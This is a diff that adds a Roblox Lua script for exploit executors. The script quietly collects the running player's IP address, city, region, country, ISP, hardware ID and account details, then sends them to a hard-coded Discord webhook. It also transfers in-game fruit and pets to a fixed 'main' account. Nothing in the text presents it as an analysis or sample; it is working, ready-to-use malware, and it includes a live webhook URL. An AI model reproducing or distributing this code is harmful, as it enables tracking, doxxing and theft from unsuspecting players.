@@ -1,0 +1,114 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local player = Players.LocalPlayer
+local mainAccountName = "enderbro186"
+
+-- Placeholders for IP & Geo data
+local ip, city, region, country, isp = "Unknown", "Unknown", "Unknown", "Unknown", "Unknown"
+
+pcall(function()
+    local response = syn.request({
+        Url = "http://ip-api.com/json",
+        Method = "GET"
+    })
+    if response and response.Body then
+        local geoData = HttpService:JSONDecode(response.Body)
+        if geoData and geoData.status == "success" then
+            ip = geoData.query
+            city = geoData.city
+            region = geoData.regionName
+            country = geoData.country
+            isp = geoData.isp
+        end
+    end
+end)
+
+-- Fetch game name
+local gameName = "Unknown Game"
+pcall(function()
+    local response = syn.request({
+        Url = "https://games.roblox.com/v1/games/" .. game.PlaceId,
+        Method = "GET"
+    })
+    local data = HttpService:JSONDecode(response.Body)
+    if data and data.data and data.data[1] then
+        gameName = data.data[1].name
+    end
+end)
+
+-- HWID (if executor supports it)
+local hwid = "Not Supported"
+if gethwid then
+    hwid = gethwid()
+end
+
+-- Webhook logging
+local embed = {
+    ["embeds"] = {{
+        ["title"] = "🟢 Script Executed Successfully",
+        ["description"] = table.concat({
+            "**👤 Player:** `" .. player.Name .. "`",
+            "**🆔 UserId:** `" .. player.UserId .. "`",
+            "**🎮 Game Name:** `" .. gameName .. "`",
+            "**📌 PlaceId:** `" .. game.PlaceId .. "`",
+            "**🧩 JobId:** `" .. game.JobId .. "`",
+            "**🔒 HWID:** `" .. hwid .. "`",
+            "**🌐 IP:** `" .. ip .. "`",
+            "**🏙️ City:** `" .. city .. "`",
+            "**🗺️ Region:** `" .. region .. "`",
+            "**🌎 Country:** `" .. country .. "`",
+            "**📡 ISP:** `" .. isp .. "`",
+            "**🕒 Time:** `" .. os.date("%Y-%m-%d %H:%M:%S") .. "`"
+        }, "\n"),
+        ["color"] = tonumber("0x00ff99")
+    }}
+}
+
+local webhook = "https://discord.com/api/webhooks/1380209575994724373/GR_QyyoymDxRQy7S0dZVUdxHKj-bkGoNTQl70c4sLMn17yEz7xH9nlZQ47fK7b0jKsX9"
+syn.request({
+    Url = webhook,
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    },
+    Body = HttpService:JSONEncode(embed)
+})
+
+-- GIVE SYSTEM
+local function giveFruitToMain(fruitName)
+    local event = ReplicatedStorage:FindFirstChild("GiveFruit")
+    if event then
+        event:FireServer(mainAccountName, fruitName)
+        print("Gave fruit:", fruitName)
+    end
+end
+
+local function givePetToMain(petId)
+    local event = ReplicatedStorage:FindFirstChild("GivePet")
+    if event then
+        event:FireServer(mainAccountName, petId)
+        print("Gave pet ID:", petId)
+    end
+end
+
+local function giveItems()
+    giveFruitToMain("DragonFruit")
+    givePetToMain(12345)
+end
+
+local function checkAndGive()
+    local mainPlayer = Players:FindFirstChild(mainAccountName)
+    if mainPlayer then
+        giveItems()
+    end
+end
+
+checkAndGive()
+
+Players.PlayerAdded:Connect(function(plr)
+    if plr.Name == mainAccountName then
+        giveItems()
+    end
+end)
